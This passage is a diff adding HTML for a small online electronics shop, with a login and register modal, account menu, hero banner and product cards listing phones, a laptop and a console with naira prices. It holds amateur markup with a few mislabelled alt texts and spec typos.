+                    <div class="cart-link" id="cartLink">
+                        <i class="fas fa-shopping-cart cart-icon"></i>
+                        <span class="cart-count" id="cartCount">0</span>
+                    </div>
+                </div>
+            </div>
+            <nav class="navbar">
+                <ul class="nav-links">
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#phones-products">Phones</a></li>
+                    <li><a href="#laptops-products">Laptops</a></li>
+                    <li><a href="#accessories-products">Accessories</a></li>
+                    <li><a href="#">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+<!-- Login/Register Modal -->
+<!-- Login/Register Modal -->
+<div class="login-modal" id="loginModal">
+    <div class="login-content">
+        <span class="close-login" id="closeLogin">&times;</span>
+        <h2>Desolution Tech</h2>
+        
+        <!-- Tabs -->
+        <div class="auth-tabs">
+            <button class="auth-tab active" id="loginTab">Login</button>
+            <button class="auth-tab" id="registerTab">Register</button>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" class="auth-form" style="display: block;">
+            <div class="form-group">
+                <input type="text" id="loginUsername" placeholder="Username" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="loginPassword" placeholder="Password" required>
+            </div>
+            <button type="submit" class="auth-btn">Login</button>
+        </form>
+
+        <!-- Register Form -->
+        <form id="registerForm" class="auth-form" style="display: none;">
+            <div class="form-group">
+                <input type="text" id="regUsername" placeholder="Choose Username" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="regPassword" placeholder="Choose Password" required>
+            </div>
+            <div class="form-group">
+                <input type="email" id="regEmail" placeholder="Email Address" required>
+            </div>
+            <div class="form-group">
+                <input type="tel" id="regPhone" placeholder="Phone Number">
+            </div>
+            <div class="form-group">
+                <input type="text" id="regName" placeholder="Full Name">
+            </div>
+            <button type="submit" class="auth-btn">Create Account</button>
+        </form>
+        
+        <p class="auth-note">if your register says unsuccessful its successful "it server error" </p>
+    </div>
+</div>
+
+<!-- Account Dropdown -->
+<div class="account-dropdown" id="accountDropdown">
+    <div class="user-header">
+        <div class="user-avatar">👤</div>
+        <div class="user-info">
+            <h4 id="userGreeting">Welcome!</h4>
+            <p id="userEmail">Please login to see your account</p>
+        </div>
+    </div>
+    
+    <div class="account-menu">
+        <div class="menu-item" id="viewOrders">
+            <i class="fas fa-shopping-bag"></i>
+            <span>Order History</span>
+            <span class="menu-badge" id="ordersCount">0</span>
+        </div>
+        
+        <div class="menu-item" id="viewCart">
+            <i class="fas fa-shopping-cart"></i>
+            <span>Current Cart</span>
+            <span class="menu-badge" id="cartItemsCount">0</span>
+        </div>
+        
+        <div class="menu-item" id="savedItems">
+            <i class="fas fa-heart"></i>
+            <span>Wishlist</span>
+            <span class="menu-badge" id="wishlistCount">0</span>
+        </div>
+        
+        <div class="menu-divider"></div>
+        
+        <div class="menu-item" id="accountSettings">
+            <i class="fas fa-cog"></i>
+            <span>Account Settings</span>
+        </div>
+        
+        <div class="menu-item" id="logoutBtn">
+            <i class="fas fa-sign-out-alt"></i>
+            <span>Logout</span>
+        </div>
+    </div>
+</div>
+         <!-- Hero Banner -->
+    <section class="hero-banner">
+        <div class="hero-content">
+            <div class="hero-text">
+                <h1>Premium Tech Gadgets for the Modern Life</h1>
+                <p>Discover the latest smartphones, laptops, and accessories with cutting-edge technology and sleek designs.</p>
+                
+                <div class="cta-buttons">
+                    <a href="#products" class="btn btn-primary">
+                        <i class="fas fa-mobile-alt"></i> Show Phones
+                    </a>
+                    <a href="#categories" class="btn btn-secondary">
+                        <i class="fas fa-grid"></i> View All Categories
+                    </a>
+                </div>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <div class="stat-icon">
+                            <i class="fas fa-truck"></i>
+                        </div>
+                        <div class="stat-text">
+                            <div class="stat-number">24h</div>
+                            <div class="stat-label">Fast Delivery</div>
+                        </div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <div class="stat-text">
+                            <div class="stat-number">2Y</div>
+                            <div class="stat-label">Warranty</div>
+                        </div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-icon">
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <div class="stat-text">
+                            <div class="stat-number">4.8/5</div>
+                            <div class="stat-label">Customer Rating</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="hero-visual">
+                <div class="phone-showcase">
+                    <img src="https://i.pinimg.com/736x/db/56/ba/db56ba8cbd61420ddbcaf45fdf9d44e9.jpg" alt="Premium Smartphone" class="phone-img">
+                    
+                    <div class="floating-elements">
+                        <div class="floating-element element-1">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <div class="floating-element element-2"></div>
+                        <div class="floating-element element-3">
+                            <i class="fas fa-bolt"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+      <!-- Hero Section -->
+<section id="categories-hero" class="categories-hero">
+    <div class="container">
+        <div class="hero-header">
+            <h1>Premium Tech Collection</h1>
+            <p>Discover the latest innovations in technology across all categories</p>
+        </div>
+        
+        <div class="categories-grid">
+            <!-- Phones Category -->
+            <div class="category-card" id="phones">
+                <div class="category-icon">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                <h2>Smartphones</h2>
+                <p>Latest models with cutting-edge features and performance</p>
+                <div class="category-features">
+                    <span>5G Connectivity</span>
+                    <span>Advanced Cameras</span>
+                    <span>All-Day Battery</span>
+                </div>
+                <a href="#phones-products" class="cta-button">Explore Phones</a>
+            </div>
+
+            <!-- Laptops Category -->
+            <div class="category-card" id="laptops">
+                <div class="category-icon">
+                    <i class="fas fa-laptop"></i>
+                </div>
+                <h2>Laptops</h2>
+                <p>Powerful machines for work, creativity, and entertainment</p>
+                <div class="category-features">
+                    <span>High Performance</span>
+                    <span>Ultra-Slim Design</span>
+                    <span>Long Battery Life</span>
+                </div>
+                <a href="#laptops-products" class="cta-button">Explore Laptops</a>
+            </div>
+
+            <!-- Accessories Category -->
+            <div class="category-card" id="accessories">
+                <div class="category-icon">
+                    <i class="fas fa-headphones"></i>
+                </div>
+                <h2>Accessories</h2>
+                <p>Enhance your experience with premium tech accessories</p>
+                <div class="category-features">
+                    <span>Wireless Tech</span>
+                    <span>Premium Audio</span>
+                    <span>Protection</span>
+                </div>
+                <a href="#accessories-products" class="cta-button">Explore Accessories</a>
+            </div>
+        </div>
+    </div>
+</section>
+    <!-- Products Section -->
+    <section class="products-section" id="products">
+        <div class="container">
+            <h2 class="section-title">NEW DEVICES</h2>
+            <div class="products-grid">
+                <!-- iphone 16 -->
+               <div class="product-card">
+    <img src="https://i.pinimg.com/1200x/f6/87/93/f68793c3e9d5ad83b445fc257ccbc196.jpg" 
+         alt="iPhone 16" 
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 16</h3>
+        <p class="description"> <b>ROM:128gb</b> <br>
+            <b>RAM: NA</b> <br>
+            <b>status: PYSICAL SIM, BRAND NEW</b>
+        </p>  
+        <p class="price">₦1,000,070</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="iPhone 16" 
+                data-price="1000070" 
+                data-img="https://i.pinimg.com/1200x/f6/87/93/f68793c3e9d5ad83b445fc257ccbc196.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+                   <!-- airpod pro 4 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/20/40/00/20400079f916f5ce133ee788b8156868.jpg" 
+         alt="Airpod Pro 4" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Airpod Pro 4</h3>
+       <p class="description"> 
+            <b>status: BRAND NEW</b>
+        </p>       
+         <p class="price">₦170,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="Airpod Pro 4" 
+                data-price="170000" 
+                data-img="https://i.pinimg.com/1200x/20/40/00/20400079f916f5ce133ee788b8156868.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+                   <!-- samsung s24-->
+                           <div class="product-card">
+    <img src="https://i.pinimg.com/736x/f6/05/51/f605518975bc69306692259cbdff1bb4.jpg" 
+         alt="iPhone 16" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Samsung s24</h3>
+       <p class="description"> <b>ROM: 128gb</b> <br>
+            <b>RAM: NA</b> <br>
+            <b>status: UK used</b><br>
+        </p>        <p class="price">₦464,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="samsung s24" 
+                data-price="464000" 
+                data-img="https://i.pinimg.com/736x/f6/05/51/f605518975bc69306692259cbdff1bb4.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+                   <!-- google pixel -->
+                           <div class="product-card">
+    <img src="https://i.pinimg.com/1200x/75/23/fa/7523fa6c2550ee563c5a786fe3af5a5f.jpg" 
+         alt="" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Google Pixel 7</h3>
+        <p class="description"> <b>ROM: 128gb</b> <br>
+            <b>RAM: NA</b> <br>
+            <b>status: UK used</b> <br>
+            COMES WITH A FREE 10,000 MAH POWER BANK
+        </p>
+        <p class="price">₦275,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="Google pixel 7" 
+                data-price="275000" 
+                data-img="https://i.pinimg.com/1200x/75/23/fa/7523fa6c2550ee563c5a786fe3af5a5f.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+
+                <!-- MacBook Air 2024 M3 -->
+                        <div class="product-card">
+    <img src="https://i.pinimg.com/736x/df/ab/77/dfab7700b36f5a0708105c8b6f7dd56b.jpg" 
+         alt="" 
+         class="product-image">
+    <div class="product-info">
+        <h3>MacBook Air 2024 M3</h3>
+        <p class="description"><b>ROM: 256gb</b><br>
+        <b>RAM: 8gb</b><br>
+        <b>status: 13inches, CC27, UK used</b></p>
+        <p class="price">₦1,490,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="MacBook Air 2024 M3" 
+                data-price="1490000" 
+                data-img="https://i.pinimg.com/736x/df/ab/77/dfab7700b36f5a0708105c8b6f7dd56b.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+                <!-- Product 4 -->
+                         <div class="product-card">
+    <img src="https://i.pinimg.com/originals/67/2d/5a/672d5ab0b97277621d6c791dd6a1ad6e.png" 
+         alt="iPhone 16" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Play Station 5 Fat</h3>
+        <p class="description"> <b>status: BRAND NEW</b></p>
+        <p class="price">₦790,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="Play Station 5 Fat" 
+                data-price="790000" 
+                data-img="https://i.pinimg.com/originals/67/2d/5a/672d5ab0b97277621d6c791dd6a1ad6e.png">
+            Add to Cart
+        </button>
+    </div>
+</div>
+  </section>
+   
+
+<!-- Products Sections -->
+<section id="phones-products" class="products-section">
+    <div class="container">
+        <div class="section-header">
+            <h2>Premium Smartphones</h2>
+            <p>Discover our collection of cutting-edge mobile devices</p>
+        </div>
+        <div class="products-grid">
+            <!-- iPhone 11 Pro Max -->
+            <div class="product-card">
+    <img src="https://i.pinimg.com/1200x/27/9f/c8/279fc86a22360453f4f4790954957916.jpg" 
+         alt="iPhone 11 Pro Max 256GB" 
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 11 Pro Max </h3>
+        <p class="description">
+            <b>Status: BRAND NEW</b>
+            <b>ROM: 256GB</b>
+        </p>
+        <p class="price">₦440,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="iPhone 11 Pro Max 256GB" 
+                data-price="440000" 
+                data-img="https://i.pinimg.com/1200x/27/9f/c8/279fc86a22360453f4f4790954957916.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+            
+<!-- iPhone 12 Pro Max -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/ae/6f/ce/ae6fcea5d61626ed099c2c608bac954c.jpg"
+         alt="iPhone 12 Pro Max 256GB" 
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 12 Pro Max </h3>
+        <p class="description">
+            <b>Status: BRAND NEW</b>
+            <b>ROM: 128GB</b>
+        </p>
+        <p class="price">₦570,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="iPhone 12 Pro Max 256GB" 
+                data-price="570000" 
+                data-img="https://i.pinimg.com/1200x/ae/6f/ce/ae6fcea5d61626ed099c2c608bac954c.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+
+<!-- iPhone 13 Pro -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/e0/87/14/e08714336780dd6735bc9284f2098e27.jpg"
+         alt="iPhone 13 Pro 128GB" 
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 13 Pro</h3>
+        <p class="description">
+            <b>Status: BRAND NEW</b><br>
+            <b>RAM: 128GB</b><br>
+            <b>Stock: 6pcs</b>
+        </p>
+        <p class="price">₦570,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="iPhone 13 Pro 128GB" 
+                data-price="570000" 
+                data-img="https://i.pinimg.com/736x/e0/87/14/e08714336780dd6735bc9284f2098e27.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+
+          <!-- iPhone 13 Pro 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/2a/55/04/2a55045e7eacab0c5982fb5d3125ff27.jpg"
+         alt="iPhone 13 Pro 128GB"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 13 Pro</h3>
+        <p class="description">
+            <b>Status: BRAND NEW</b><br>
+            <b>ROM: 128GB</b>
+        </p>
+        <p class="price">₦570,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 13 Pro 128GB"
+                data-price="570000"
+                data-img="https://i.pinimg.com/1200x/2a/55/04/2a55045e7eacab0c5982fb5d3125ff27.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 14 Pro 1TB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/19/7f/61/197f61ea27ac09f5f5733f97dfe57b36.jpg"
+         alt="iPhone 14 Pro 1TB Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 14 Pro</h3>
+        <p class="description">
+            <b>ROM: 1TB</b><br>
+            <b>Esim Unlocked</b><br>
+            <b>Face ID ✅ | TT ✅</b>
+        </p>
+        <p class="price">₦900,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 14 Pro 1TB Esim Unlocked"
+                data-price="900000"
+                data-img="https://i.pinimg.com/1200x/19/7f/61/197f61ea27ac09f5f5733f97dfe57b36.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 14 Pro Max 128GB (Esim unlocked) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/e0/87/14/e08714336780dd6735bc9284f2098e27.jpg"
+         alt="iPhone 14 Pro Max 128GB Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 14 Pro Max</h3>
+        <p class="description">
+            <b>ROM: 128GB</b><br>
+            <b>Esim Unlocked</b>
+        </p>
+        <p class="price">₦810,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 14 Pro Max 128GB Esim Unlocked"
+                data-price="810000"
+                data-img="https://i.pinimg.com/736x/e0/87/14/e08714336780dd6735bc9284f2098e27.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 14 Pro Max 128GB (Physical SIM, Canada) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/09/30/e3/0930e393ea8787e136c3688a1a2a9fdc.jpg"
+         alt="iPhone 14 Pro Max 128GB Physical SIM Canada"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 14 Pro Max</h3>
+        <p class="description">
+            <b>ROM: 128GB</b><br>
+            <b>Physical SIM Unlocked</b><br>
+            <b>Canada Region</b>
+        </p>
+        <p class="price">₦930,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 14 Pro Max 128GB Physical SIM Canada"
+                data-price="930000"
+                data-img="https://i.pinimg.com/736x/09/30/e3/0930e393ea8787e136c3688a1a2a9fdc.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- iPhone 15 256GB (Esim unlocked) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/26/36/da/2636da195725d12328e12cf4073097b8.jpg"
+         alt="iPhone 15 256GB Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15</h3>
+        <p class="description">
+            <b>ROM: 256GB</b><br>
+            <b>Esim Unlocked</b>
+        </p>
+        <p class="price">₦890,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 256GB Esim Unlocked"
+                data-price="890000"
+                data-img="https://i.pinimg.com/736x/26/36/da/2636da195725d12328e12cf4073097b8.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 15 Pro 128GB (Esim unlocked, 2pcs) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/cb/2a/d0/cb2ad0bbc24149758f88797d22b54ab7.jpg"
+         alt="iPhone 15 Pro 128GB Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15 Pro</h3>
+        <p class="description">
+            <b>ROM: 128GB</b><br>
+            <b>Esim Unlocked</b><br>
+            <b>Stock: 2pcs</b>
+        </p>
+        <p class="price">₦920,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 Pro 128GB Esim Unlocked"
+                data-price="920000"
+                data-img="https://i.pinimg.com/736x/cb/2a/d0/cb2ad0bbc24149758f88797d22b54ab7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 15 Pro 256GB (Esim unlocked, 2pcs) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/9f/49/20/9f4920ad8ffc8d7ec3c54b36b474886c.jpg"
+         alt="iPhone 15 Pro 256GB Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15 Pro</h3>
+        <p class="description">
+            <b>ROM: 256GB</b><br>
+            <b>Esim Unlocked</b><br>
+            <b>Stock: 2pcs</b>
+        </p>
+        <p class="price">₦960,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 Pro 256GB Esim Unlocked"
+                data-price="960000"
+                data-img="https://i.pinimg.com/736x/9f/49/20/9f4920ad8ffc8d7ec3c54b36b474886c.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 15 Pro Max 256GB (Physical SIM, 3pcs) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/cb/2a/d0/cb2ad0bbc24149758f88797d22b54ab7.jpg"
+         alt="iPhone 15 Pro Max 256GB Physical SIM"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15 Pro Max</h3>
+        <p class="description">
+            <b>ROM: 256GB</b><br>
+            <b>Physical SIM</b><br>
+            <b>Stock: 3pcs</b>
+        </p>
+        <p class="price">₦1,260,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 Pro Max 256GB Physical SIM"
+                data-price="1260000"
+                data-img="https://i.pinimg.com/1200x/cb/2a/d0/cb2ad0bbc24149758f88797d22b54ab7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 15 Pro Max 512GB (Esim unlocked) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/d7/3c/35/d73c35e2c8751abebdd88abbfe5cffbd.jpg"
+         alt="iPhone 15 Pro Max 512GB Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15 Pro Max</h3>
+        <p class="description">
+            <b>ROM: 512GB</b><br>
+            <b>Esim Unlocked</b>
+        </p>
+        <p class="price">₦1,260,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 Pro Max 512GB Esim Unlocked"
+                data-price="1260000"
+                data-img="https://i.pinimg.com/736x/d7/3c/35/d73c35e2c8751abebdd88abbfe5cffbd.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 15 Pro Max 512GB (UK Used, Physical + Esim unlocked) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/9f/49/20/9f4920ad8ffc8d7ec3c54b36b474886c.jpg"
+         alt="iPhone 15 Pro Max 512GB UK Used Physical + Esim"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15 Pro Max</h3>
+        <p class="description">
+            <b>ROM: 512GB</b><br>
+            <b>🇬🇧 UK Used</b><br>
+            <b>Physical + Esim Unlocked</b>
+        </p>
+        <p class="price">₦1,330,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 Pro Max 512GB UK Used Physical + Esim"
+                data-price="1330000"
+                data-img="https://i.pinimg.com/736x/9f/49/20/9f4920ad8ffc8d7ec3c54b36b474886c.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPhone 15 Pro Max 1TB (UK Used, Esim unlocked) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/7e/15/5d/7e155d479811e75949ee91db511104a4.jpg"
+         alt="iPhone 15 Pro Max 1TB UK Used Esim Unlocked"
+         class="product-image">
+    <div class="product-info">
+        <h3>iPhone 15 Pro Max</h3>
+        <p class="description">
+            <b>ROM: 1TB</b><br>
+            <b>🇬🇧 UK Used</b><br>
+            <b>Esim Unlocked</b>
+        </p>
+        <p class="price">₦1,330,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn"
+                data-product="iPhone 15 Pro Max 1TB UK Used Esim Unlocked"
+                data-price="1330000"
+                data-img="https://i.pinimg.com/1200x/7e/15/5d/7e155d479811e75949ee91db511104a4.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Google Pixel 7 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/fb/c4/82/fbc482e372ba1a5f7ac4e480facaff20.jpg"
+         alt="Pixel 7 128GB" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Pixel 7 (UK Used)</h3>
+        <p class="description">
+            <b>ROM: 128GB</b><br>
+            <b>Comes with free 10,000mAh power bank</b>
+        </p>
+        <p class="price">₦275,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="Pixel 7 128GB (UK Used)" 
+                data-price="275000" 
+                data-img="https://i.pinimg.com/736x/fb/c4/82/fbc482e372ba1a5f7ac4e480facaff20.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Galaxy 10 Plus -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/ef/e4/62/efe4626373d2106616f35a97f10f97f6.jpg"
+         alt="Galaxy 10 Plus 128GB" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy 10 Plus</h3>
+        <p class="description">
+            <b>Status: UK 🇬🇧 Direct</b><br>
+            <b>ROM: 128GB</b><br>
+            <b>Factory Unlocked</b>
+        </p>
+        <p class="price">₦310,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="Samsung Galaxy 10 Plus 128GB" 
+                data-price="310000" 
+                data-img="https://i.pinimg.com/1200x/ef/e4/62/efe4626373d2106616f35a97f10f97f6.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Galaxy S22 Ultra -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/ef/b4/85/efb4859da727a33c1c43938aec618d31.jpg"
+         alt="Samsung Galaxy S22 Ultra 128GB" 
+         class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S22 Ultra</h3>
+        <p class="description">
+            <b>Status: UK 🇬🇧 Direct</b><br>
+            <b>ROM: 128GB</b><br>
+            <b>Factory Unlocked</b><br>
+            <b>Stock: 2pcs</b>
+        </p>
+        <p class="price">₦480,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+                data-product="Samsung Galaxy S22 Ultra 128GB" 
+                data-price="480000" 
+                data-img="https://i.pinimg.com/1200x/ef/b4/85/efb4859da727a33c1c43938aec618d31.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Samsung A14 64GB 5G -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/7a/1e/e8/7a1ee8c0764c1b967a92f6b7f6004d29.jpg"
+         alt="Samsung A14 64GB 5G" class="product-image">
+    <div class="product-info">
+        <h3>Samsung A14 5G</h3>
+        <p class="description"><b>ROM: 64GB</b></p>
+        <p class="price">₦123,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung A14 64GB 5G" 
+            data-price="123000" 
+            data-img="https://i.pinimg.com/1200x/7a/1e/e8/7a1ee8c0764c1b967a92f6b7f6004d29.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung A15 128GB 5G -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/cd/70/e5/cd70e524e2d678f12c972bde6a8fea1b.jpg"
+         alt="Samsung A15 128GB 5G" class="product-image">
+    <div class="product-info">
+        <h3>Samsung A15 5G</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦148,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung A15 128GB 5G" 
+            data-price="148000" 
+            data-img="https://i.pinimg.com/1200x/cd/70/e5/cd70e524e2d678f12c972bde6a8fea1b.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Note 20 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/eb/cb/db/ebcbdb1241d287605ccc63095f212cf9.jpg"
+         alt="Samsung Note 20 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Note 20</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦250,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
